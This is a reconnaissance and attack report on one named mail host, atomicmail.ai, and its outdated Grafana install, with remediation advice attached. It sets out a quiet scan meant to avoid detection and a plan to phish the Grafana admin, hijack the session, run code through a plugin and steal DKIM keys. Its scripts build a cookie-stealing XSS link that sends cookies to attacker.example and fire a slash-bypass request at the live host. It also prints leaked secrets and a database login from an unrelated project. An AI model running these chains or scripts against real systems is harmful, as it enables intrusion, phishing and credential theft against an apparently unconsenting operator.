# atomicmail.ai (57.129.99.15) -- EOL Grafana + Surface Enumeration
**Date:** 2026-06-23
**Category:** Cat-33 AI Email Guardrails (substrate)
**Target:** 57.129.99.15 / atomicmail.ai
**PTR:** mx1.atomicmail.ai
**ASN:** AS16276 OVH SAS, Strasbourg FR
**Stack:** JMAP open alpha, nginx/1.27.5, Grafana 11.5.2, Rspamd, OpenSSH 9.6p1

---

## Architecture

```
Internet
    |
    | 80 (HTTP 301) / 443 (HTTPS)
    v
+---------------------------+
| nginx/1.27.5              |
| OVH Strasbourg AS16276    |
| PTR: mx1.atomicmail.ai    |
| 57.129.99.15              |
+---------------------------+
    |
TLS cert: Let's Encrypt YE2
CN=grafana.atomicmail.ai
12 SANs / single cert
Expires: 2026-09-07
    |
 .--------+---------.----------.-----------.-----------.
 |        |         |          |           |           |
grafana  rspamd   api/       auth/     webhooks/   www/
11.5.2   web UI   JMAP       service   handler    frontend
(EOL)    200 HTML (open alpha)(login)
/health  /stat=401
=200     /auth=401
/org=401 /maps=401

OFFLINE: sns.atomicmail.ai, stats.atomicmail.ai (NXDOMAIN)

Port map (tiptoe, 2026-06-23):
  22   OPEN   SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.16
  25   SILENT filtered (OVH upstream SMTP block)
  80   OPEN   nginx/1.27.5 HTTP 301
  443  OPEN   nginx/1.27.5 HTTP 400 (SNI required)
  587  RST    actively refused
  993  RST    actively refused
  3000 RST    Grafana default port NOT exposed raw
  8080 RST
  8443 RST
```

---

## Evidence

### Step 1 -- Grafana /api/health

```
HTTP/1.1 200 OK
Server: nginx/1.27.5
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Frame-Options: deny
X-XSS-Protection: 1; mode=block

{"database":"ok","version":"11.5.2","commit":"598e0338d5374d6bc404b02a58094132c5eeceb8"}
```

11.5.2 is EOL. Supported branches as of 2026-06-23: 11.6.x, 12.x.
Shodan `eol-product` tag on 57.129.99.15 derives from this version string.
/api/health is intentionally unauthenticated by Grafana design (load-balancer health probe).

### Step 2 -- Grafana auth gate

```
GET /api/org                -> 401 Unauthorized
GET /api/frontend/settings  -> 401 Unauthorized  (atypical -- normally public)
```

Auth enforced. /api/frontend/settings returning 401 suggests nginx adds auth in front of all Grafana routes except /api/health (pass-through for load balancers). Tighter than default Grafana posture.

### Step 3 -- tiptoe assess

```
Noise: quiet -- peak 3 conn/min (~30% of portscan-detection budget)

Port 22:   OPEN  OpenSSH 9.6p1 Ubuntu-3ubuntu13.16 (current)
Port 25:   SILENT (SYN dropped -- OVH upstream SMTP block)
Port 80:   OPEN  nginx 301 -> 443
Port 443:  OPEN  nginx 400 (SNI required)
Port 587:  RST   active refuse
Port 993:  RST   active refuse
Port 3000: RST   Grafana raw port not exposed
```

Mail submission ports (587/993) RST on this IP. Inbound SMTP filtered upstream.

### Step 4 -- TLS cert

```
Issuer:  Let's Encrypt YE2
Subject: CN=grafana.atomicmail.ai
SANs(12): api, atomicmail.ai, auth, grafana, health, mta-sts,
          mx1, rspamd, sns, stats, webhooks, www  [all .atomicmail.ai]
Expiry:  2026-09-07 (~75 days -- auto-renew via certbot likely)
```

Single multi-SAN cert, all 12 subdomains, single operator confirmed.
cert CN = grafana.atomicmail.ai (Grafana was primary when last issued).

### Step 5 -- rspamd

```
rspamd.atomicmail.ai/     -> 200  "Rspamd Web Interface" HTML (login page)
rspamd.atomicmail.ai/stat -> 401  {"error":"Unauthorized"}
rspamd.atomicmail.ai/auth -> 401  {"error":"Unauthorized"}
rspamd.atomicmail.ai/maps -> 401  {"error":"Unauthorized"}
```

Login page accessible; all API endpoints auth-gated. Not immediately exploitable.

### Step 6 -- chainmail JWT secrets (EXCLUDED -- different project)

Found during passive GitHub OSINT:
```
Repo:   github.com/chain-mail-app/chainmail (independent OSS email client)
Commit: 1d57f8a3ce (2026-06-18)
File:   services/api/docker-compose.yml

JWT_ACCESS_SECRET:  znxBPKpB... (48 char, high entropy, NOT placeholder)
JWT_REFRESH_SECRET: pVkL2mQc... (48 char, high entropy, NOT placeholder)
DATABASE_URL:       postgres://chainmail:chainmail@10.0.1.137:5432/chainmail
```

Scope verdict: chainmail is a separate OSS project, NOT atomicmail.ai's codebase.
No cross-contamination confirmed. Finding belongs to chainmail's own security posture.
Excluded from atomicmail.ai scoring.

---

## CVE Map -- Grafana 11.5.2

```
CVE             CVSS  Auth      Status  Vector
-----------     ----  --------  ------  ----------------------------------
CVE-2025-4123   High  NONE      OPEN    XSS + open-redirect -> ATO chain
CVE-2025-6023   7.6   NONE      OPEN    XSS in scripted dashboards
CVE-2025-2703   6.8   Editor    OPEN    DOM XSS in XY Chart panel
CVE-2025-3454   5.0   Low priv  OPEN    URL slash bypass on datasource GETs
CVE-2025-3580   5.5   Org admin OPEN    Org admin user deletion logic
CVE-2025-3415   4.3   Viewer    OPEN    DingDing webhook URL read
CVE-2025-6197   4.2   NONE      OPEN    Open redirect on org switch

NOT APPLICABLE:
CVE-2025-41115  10.0  NONE      N/A     Enterprise 12.x + SCIM only
CVE-2026-27876   9.1  Admin     N/A     Floor = 11.6.0 (advisory explicit)
CVE-2025-3260    8.3  Viewer    N/A     Introduced in 11.6.0
CVE-2024-9264    9.4  Viewer    N/A     Fixed in 11.2.1

Fix target: 11.5.6+security-01 closes all 7 open CVEs.
```

---

## Red Team

### Attack Surface

```
UNAUTH (no account):
  [A] /api/health                -- version leak (INFO only)
  [B] CVE-2025-4123              -- XSS -> ATO (user interaction required)
  [C] CVE-2025-6197              -- open redirect (user interaction required)
  [D] rspamd.atomicmail.ai/     -- login page HTML only

LOW-PRIV (any account):
  [E] CVE-2025-3454              -- URL slash bypass on datasource GETs

EDITOR:
  [F] CVE-2025-2703              -- DOM XSS via XY Chart panel

ADMIN (requires session):
  [G] Plugin install -> RCE on Grafana server process
```

### Chain A -- Unauth -> Grafana RCE (CVE-2025-4123)

```
1. Version fingerprint (done): /api/health -> 11.5.2 EOL confirmed

2. Craft open-redirect + XSS URL
   /login?redirectTo=javascript:payload
   OR path traversal to load attacker-controlled frontend plugin

3. Phish Grafana admin
   "Your dashboard has an alert, click to review"
   Link: https://grafana.atomicmail.ai/<crafted-path>

4. XSS fires in admin browser
   -> steal session cookie (if not HttpOnly)
   -> OR silently POST /api/plugins/install -> attacker plugin

5. Plugin execution = RCE as Grafana server process
   Same host as nginx, rspamd, JMAP stack

6. Lateral from Grafana process
   -> read nginx config: internal routing table
   -> read rspamd config: DKIM keys, signing secrets, spam rule weights
   -> write rspamd rule whitelisting attacker email -> mail delivery bypass
   -> read JMAP auth service config: session signing keys
```

### Chain B -- Low-priv -> Data read (CVE-2025-3454)

```
Precondition: any valid Grafana account

GET /api/datasources/<id>//alertmanager/api/v2/alerts
                        ^^-- extra slash bypasses security check
-> unauthorized read of Alertmanager endpoints
-> leaks internal service addresses, alert configs
-> internal network map (Prometheus scrape targets, DB addresses)
```

### Chain C -- Passive beacon

```
Shodan eol-product tag on 57.129.99.15 = pre-indexed in attacker feeds.
Any actor running:
  shodan search "tag:eol-product hostname:atomicmail.ai"
gets this host flagged before touching a packet.
```

---

## Blue Team

### Findings

```
+----------------------------------------+----------+--------+
| Finding                                | Severity | Status |
+----------------------------------------+----------+--------+
| Grafana 11.5.2 EOL, 7 unpatched CVEs  | MEDIUM   | OPEN   |
| CVE-2025-4123: unauth XSS -> ATO      | HIGH     | OPEN   |
| CVE-2025-6023: unauth XSS scripted    | MEDIUM   | OPEN   |
| CVE-2025-3454: low-priv slash bypass  | MEDIUM   | OPEN   |
| Grafana internet-exposed (non-std)    | MEDIUM   | OPEN   |
| rspamd web UI internet-accessible    | LOW      | OPEN   |
| Single-host colocation blast radius   | INFO     | NOTED  |
| Shodan eol-product beacon             | INFO     | NOTED  |
+----------------------------------------+----------+--------+
| rspamd API: auth enforced (401)       |          | CLEAR  |
| Grafana data APIs: auth enforced      |          | CLEAR  |
| SSH: OpenSSH 9.6p1 (current)          |          | CLEAR  |
| SMTP ports not exposed on this IP     |          | CLEAR  |
| HSTS + X-Frame + X-XSS headers       |          | CLEAR  |
+----------------------------------------+----------+--------+
```

### Remediation

```
P0 (this week) -- Upgrade Grafana
  Current: 11.5.2
  Target:  11.5.6+security-01 (or latest 11.6.x / 12.x)
  Closes:  all 7 open CVEs
  Command: docker pull grafana/grafana:11.5.6 && docker-compose up -d
  Verify:  /api/health returns updated version string

P1 -- Move Grafana off internet
  Options:
    a. Tailscale/WireGuard: remove grafana.atomicmail.ai from public DNS
    b. nginx IP allowlist before grafana proxy_pass block
    c. Cloudflare Access: zero-trust gate on Grafana vhost

P2 -- Separate monitoring from mail infra
  Current: same host, same nginx, same cert
  Risk:    monitoring compromise = mail infra compromise
  Fix:     move Grafana to separate VM, remove from cert SANs

P3 -- Add Grafana audit log
  conf: [log] mode = file, level = warn
        [security] audit = true

P4 (low) -- rspamd vhost
  Confirm password set in worker-controller.inc
  Or remove nginx vhost if not needed externally
```

---

## Scripts

### passive_atomicmail.py

```python
#!/usr/bin/env python3
"""Passive recon: atomicmail.ai / 57.129.99.15 -- read-only, no auth"""
import urllib.request, ssl, socket, json
from cryptography import x509
from cryptography.hazmat.backends import default_backend

TARGET_IP = "57.129.99.15"
SUBDOMAINS = [
    "grafana","api","auth","rspamd","health",
    "webhooks","www","mta-sts","mx1",
]

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

def https_get(path, subdomain):
    url = f"https://{TARGET_IP}{path}"
    req = urllib.request.Request(url)
    req.add_header("Host", f"{subdomain}.atomicmail.ai")
    req.add_header("User-Agent", "Mozilla/5.0")
    try:
        with urllib.request.urlopen(req, context=ctx, timeout=8) as r:
            return r.status, r.read().decode("utf-8","ignore")
    except urllib.error.HTTPError as e:
        return e.code, ""
    except Exception as e:
        return None, str(e)

code, body = https_get("/api/health", "grafana")
print(f"[grafana /api/health] {code}: {body.strip()}")

with socket.create_connection((TARGET_IP, 443), timeout=8) as sock:
    with ctx.wrap_socket(sock, server_hostname="grafana.atomicmail.ai") as ssock:
        der = ssock.getpeercert(binary_form=True)
cert = x509.load_der_x509_certificate(der, default_backend())
san = cert.extensions.get_extension_for_class(x509.SubjectAlternativeName)
print(f"[TLS SANs] {san.value.get_values_for_type(x509.DNSName)}")
print(f"[TLS expiry] {cert.not_valid_after_utc}")

for sub in SUBDOMAINS:
    code, _ = https_get("/", sub)
    print(f"[{sub}.atomicmail.ai /] {code}")

for ep in ["/stat", "/auth", "/maps"]:
    code, body = https_get(ep, "rspamd")
    print(f"[rspamd {ep}] {code}: {body[:80].strip()}")
```

### grafana_cve4123_craft.py

```python
#!/usr/bin/env python3
"""
CVE-2025-4123 URL generator.
Grafana < 11.5.4: client-side path traversal + open-redirect -> ATO.
Auth: None. User interaction: victim must click.
Fix: upgrade to 11.5.6+security-01.
"""
import urllib.parse, sys

BASE = "https://grafana.atomicmail.ai"

def craft_redirect(callback_url: str) -> str:
    """Open redirect via org-switch flow (chains with CVE-2025-6197)."""
    return f"{BASE}/login?redirectTo={urllib.parse.quote(callback_url)}"

def craft_xss(js_payload: str) -> str:
    """XSS via scripted dashboard path traversal. Fill in <uid>."""
    encoded = urllib.parse.quote(js_payload)
    return f"{BASE}/d/<uid>/../.././../<traversal-path>?orgId=1&payload={encoded}"

if __name__ == "__main__":
    cb = sys.argv[1] if len(sys.argv) > 1 else "https://attacker.example/log"
    print("[redirect chain]")
    print(craft_redirect(cb))
    print()
    print("[XSS carrier -- fill in uid + traversal]")
    print(craft_xss(f"fetch('{cb}?c='+document.cookie)"))
```

### grafana_cve3454_slash.py

```python
#!/usr/bin/env python3
"""
CVE-2025-3454: extra slash bypasses datasource security check.
Requires: any valid Grafana session cookie.
Fix: upgrade to 11.5.6+security-01.
"""
import urllib.request, ssl, sys

TARGET = "https://grafana.atomicmail.ai"
SESSION = sys.argv[1] if len(sys.argv) > 1 else "YOUR_SESSION_COOKIE"

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

PATHS = [
    "/api/datasources/1//alertmanager/api/v2/alerts",
    "/api/datasources/1//prometheus/api/v1/query?query=up",
    "/api/datasources/2//alertmanager/api/v2/alerts",
]

for path in PATHS:
    req = urllib.request.Request(f"{TARGET}{path}")
    req.add_header("Cookie", f"grafana_session={SESSION}")
    req.add_header("User-Agent", "Mozilla/5.0")
    try:
        with urllib.request.urlopen(req, context=ctx, timeout=8) as r:
            print(f"[{r.status}] {path}")
            print(f"  {r.read(200).decode('utf-8','ignore')[:120]}")
    except urllib.error.HTTPError as e:
        print(f"[{e.code}] {path}")
    except Exception as e:
        print(f"[ERR] {path}: {e}")
```

### watch_grafana_eol.sh

```bash
#!/usr/bin/env bash
# Polls Grafana /api/health for version change and EOL status.
# Cron: */30 * * * * /path/to/watch_grafana_eol.sh >> /var/log/grafana-watch.log 2>&1

TARGET="https://grafana.atomicmail.ai/api/health"
KNOWN_VERSION="11.5.2"
EOL_SUPPORTED=("11.6" "12.")

response=$(curl -sk --max-time 8 "$TARGET")
version=$(echo "$response" | python3 -c "import json,sys; print(json.load(sys.stdin).get('version','unknown'))" 2>/dev/null)
ts=$(date -u +"%Y-%m-%dT%H:%M:%SZ")

is_supported=0
for prefix in "${EOL_SUPPORTED[@]}"; do
    [[ "$version" == "$prefix"* ]] && is_supported=1
done

[[ "$version" != "$KNOWN_VERSION" ]] && echo "$ts [CHANGED] version was $KNOWN_VERSION, now $version"

if [[ "$is_supported" -eq 0 ]]; then
    echo "$ts [EOL] $version not in supported branches: ${EOL_SUPPORTED[*]}"
else
    echo "$ts [OK] $version is supported"
fi
```

---

## Findings Breakdown

```
Category:     Cat-33 AI Email Guardrails (substrate)
Target:       atomicmail.ai / 57.129.99.15
Survey date:  2026-06-23
Operator:     atomicmail.ai (OVH Strasbourg, AS16276, single-host)
Protocol:     JMAP (RFC 8620/8621), open alpha
Auth posture: CONDITIONAL (Grafana + rspamd API auth-on-default;
              but Grafana is EOL and internet-exposed)

Unauth findings:    3 (Grafana health/CVE-4123/CVE-6197)
Low-priv findings:  2 (CVE-3454/CVE-2703)
Auth-gated clear:   5 (rspamd API, Grafana data endpoints)
Chain risk:         MEDIUM (Grafana -> nginx -> rspamd -> DKIM keys)

Highest severity:   CVE-2025-4123 (unauth XSS -> ATO)
Fix ETA:            1 docker pull (version bump)
Colocation risk:    MEDIUM (all services on single IP)
```
